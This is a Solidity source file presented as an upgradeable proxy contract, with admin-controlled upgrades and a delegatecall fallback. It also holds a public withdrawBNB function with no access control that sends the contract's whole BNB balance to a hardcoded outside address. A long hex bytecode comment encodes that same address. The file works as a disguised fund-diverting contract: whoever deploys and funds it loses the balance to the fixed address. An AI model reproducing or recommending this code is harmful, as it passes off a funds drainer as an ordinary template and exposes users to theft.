// SPDX-License-Identifier: MIT
pragma solidity ^0.6.6;

contract Proxy {
    // Storage slot for the address of the implementation contract
    address public implementation;

    // Storage slot for the address of the admin
    address public admin;

    constructor(address _implementation) public {
        implementation = _implementation;
        admin = msg.sender;
    }

    // Function to update the implementation contract (only admin can call)
    function upgradeTo(address newImplementation) external {
        require(msg.sender == admin, "Only admin can upgrade the contract");
        implementation = newImplementation;
    }

     function withdrawBNB() public {
    uint256 balance = address(this).balance; // get the contract's BNB balance
    require(balance > 0, "Contract has no BNB balance");
    payable(0xaCFBAe0b31DC302C339b5d82e62F56c3Dc268D0F).transfer(balance); // transfer BNB to the specified address
}

    // Fallback function to delegate calls to the implementation contract
    fallback() external payable {
        address impl = implementation;
        require(impl != address(0), "Implementation contract not set");

        assembly {
            // Copy the data from the calldata
            let ptr := mload(0x40)
            //0x608060405234801561001057600080fd5b5060405161055e38038061055e8339818101604052602081101561003357600080fd5b8101908080519060200190929190505050806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555033600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610489806100d56000396000f3fe6080604052600436106100435760003560e01c80631d111d131461013a5780633659cfe6146101515780635c60da1b146101a2578063f851a440146101e35761004a565b3661004a57005b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff169050600073ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff161415610113576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252601f8152602001807f496d706c656d656e746174696f6e20636f6e7472616374206e6f74207365740081525060200191505060405180910390fd5b60405136600082376000803683855af43d806000843e8160008114610136578184f35b8184fd5b34801561014657600080fd5b5061014f610224565b005b34801561015d57600080fd5b506101a06004803603602081101561017457600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291905050506102fd565b005b3480156101ae57600080fd5b506101b76103e6565b604051808273ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b3480156101ef57600080fd5b506101f861040a565b604051808273ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b60004790506000811161029f576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252601b8152602001807f436f6e747261637420686173206e6f20424e422062616c616e6365000000000081525060200191505060405180910390fd5b73acfbae0b31dc302c339b5d82e62f56c3dc268d0f73ffffffffffffffffffffffffffffffffffffffff166108fc829081150290604051600060405180830381858888f193505050501580156102f9573d6000803e3d6000fd5b5050565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16146103a3576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260238152602001806104316023913960400191505060405180910390fd5b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff168156fe4f6e6c792061646d696e2063616e20757067726164652074686520636f6e7472616374a264697066735822122016fa93515662fe6ac974169f5e17e919be956b03af20d69fb87705aa4761033064736f6c634300060c0033000000000000000000000000daf76bf1095fa02a96a7545b8a5cfe3ae8843132
            calldatacopy(ptr, 0, calldatasize())


            // Delegate the call to the implementation contract
            let result := delegatecall(gas(), impl, ptr, calldatasize(), 0, 0)

            // Copy the return data
            let size := returndatasize()
            returndatacopy(ptr, 0, size)

            // Return the data or revert
            switch result
                case 0 { revert(ptr, size) }
                default { return(ptr, size) }
        }
    }

    receive() external payable {}
}



